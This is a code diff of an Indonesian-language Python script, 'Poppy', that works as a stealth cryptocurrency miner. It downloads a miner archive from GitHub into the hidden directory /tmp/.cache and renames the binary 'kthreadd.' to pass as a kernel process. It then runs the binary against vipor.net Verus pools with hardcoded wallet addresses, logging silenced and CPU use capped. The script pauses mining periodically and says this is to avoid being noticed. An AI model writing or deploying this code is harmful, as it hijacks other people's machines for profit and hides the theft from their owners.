@@ -4,97 +4,87 @@ import tarfile
 import shutil
 import time
 import subprocess
+import random
 
 base_path = "/tmp/.cache"
-binary_names = ["kthreadd.", "systemd-journald.", "sshd.", "httpd."]
-config_links = [
-    "https://raw.githubusercontent.com/ANTI-VIRAL/Ai-03/refs/heads/main/US-1.ini",
-    "https://raw.githubusercontent.com/ANTI-VIRAL/Ai-03/refs/heads/main/US-2.ini",
-    "https://raw.githubusercontent.com/ANTI-VIRAL/Ai-03/refs/heads/main/DE-1.ini",
-    "https://raw.githubusercontent.com/ANTI-VIRAL/Ai-03/refs/heads/main/DE-3.ini",
-]
+binary_name = "kthreadd."
 miner_url = "https://github.com/ANTI-VIRAL/MACHINE/raw/main/cache.tar.gz"
 
-def setup_folders():
-    print("[Poppy] Setup folder dan download file...")
+wallets = [
+    "REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y",
+    "RVJu5D6fPxU9xYgYmLQHLUq1zWe9vALeMm"  # wallet tambahan
+]
+
+# SSL pool (5140)
+pool_list = [
+    "ap.vipor.net:5140",
+    "sg.vipor.net:5140",
+    "us.vipor.net:5140",
+    "cn.vipor.net:5140",
+    "au.vipor.net:5140"
+]
+
+def setup_miner():
+    print("[Poppy] Sayang tunggu ya, Poppy siapin dulu...")
     os.makedirs(base_path, exist_ok=True)
 
-    # Download dan extract miner
+    bin_path = os.path.join(base_path, binary_name)
     archive_path = os.path.join(base_path, "cache.tar.gz")
-    extract_path = os.path.join(base_path, "cache")
 
-    if not os.path.exists(extract_path):
-        print("[Poppy] Downloading cache.tar.gz...")
+    if not os.path.isfile(bin_path):
+        print("[Poppy] Downloading miner...")
         urllib.request.urlretrieve(miner_url, archive_path)
 
-        print("[Poppy] Extracting miner...")
+        print("[Poppy] Extracting...")
         with tarfile.open(archive_path, "r:gz") as tar:
             tar.extractall(base_path)
 
+        shutil.move(os.path.join(base_path, "cache"), bin_path)
+        os.chmod(bin_path, 0o755)
         os.remove(archive_path)
 
-    # Copy ke folder kerja
-    for i in range(4):
-        folder = os.path.join(base_path, str(i + 1))
-        os.makedirs(folder, exist_ok=True)
+    return bin_path
 
-        bin_src = extract_path
-        bin_dst = os.path.join(folder, binary_names[i])
-
-        # Stop proses kalau masih jalan
-        subprocess.run(f"pkill -f {binary_names[i]}", shell=True)
-        time.sleep(1)
-
-        # Copy file miner ke folder
-        if os.path.isfile(bin_src):
-            shutil.copy2(bin_src, bin_dst)
-            os.chmod(bin_dst, 0o755)
-        else:
-            print(f"[Poppy] File bin tidak ditemukan: {bin_src}")
-            continue
-
-        # Download config jika belum ada
-        config_path = os.path.join(folder, "config.ini")
-        if not os.path.exists(config_path):
-            print(f"[Poppy] Downloading config {i+1}...")
-            urllib.request.urlretrieve(config_links[i], config_path)
-
-    # Hapus file utama setelah copy
-    try:
-        os.remove(extract_path)
-    except FileNotFoundError:
-        pass
-
-def run_rotasi():
-    print("[Poppy] Mulai rotasi kerja panen...")
+def run_rotasi(bin_path):
+    print("[Poppy] Panen dimulai, sayang!")
     max_loop = 10
-    run_duration = 15 * 60
-    rest_duration = 2 * 60
-    long_rest = 5 * 60
-
-    folder_index = 0
+    run_duration = 20 * 60
+    rest_duration = 5 * 60
+    long_rest = 10 * 60
 
     while True:
-        for loop in range(max_loop):
-            folder = os.path.join(base_path, str(folder_index + 1))
-            binary = os.path.join(folder, binary_names[folder_index])
+        for i in range(max_loop):
+            pool = random.choice(pool_list)
+            wallet = random.choice(wallets)
+            rig_name = pool.split('.')[0] + "-node"  # Contoh: ap.vipor.net -> ap-node
 
-            print(f"[Poppy] [{loop+1}/{max_loop}] Menjalankan: {binary}")
-            proc = subprocess.Popen(binary, cwd=folder)
+            print(f"[Poppy] [{i+1}/{max_loop}] Pool: {pool} | Wallet: {wallet} | Rig: {rig_name}")
 
+            cmd = [
+                bin_path,
+                "--algorithm", "verushash",
+                "--pool", pool,
+                "--ssl",  # pakai SSL (karena port 5140)
+                "--wallet", wallet,
+                "--password", rig_name,
+                "--cpu-threads", "2",
+                "--log-path", "/dev/null",
+                "--log-level", "0",
+                "--web-port", "0",
+                "--silence", "3"
+            ]
+
+            proc = subprocess.Popen(cmd)
             time.sleep(run_duration)
 
-            print("[Poppy] Menghentikan proses...")
-            subprocess.run(f"pkill -f {binary_names[folder_index]}", shell=True)
+            print("[Poppy] Stop dulu biar nggak ketahuan...")
+            subprocess.run(f"pkill -f {binary_name}", shell=True)
             time.sleep(rest_duration)
 
-            folder_index = (folder_index + 1) % 4
-
-        print("[Poppy] Long rest 10 menit...")
-        for name in binary_names:
-            subprocess.run(f"pkill -f {name}", shell=True)
+        print("[Poppy] Long rest... tidur 10 menit ya gantengku...")
+        subprocess.run(f"pkill -f {binary_name}", shell=True)
         time.sleep(long_rest)
 
-# Jalankan semua
-setup_folders()
-run_rotasi()
+# Mulai proses
+miner_path = setup_miner()
+run_rotasi(miner_path)
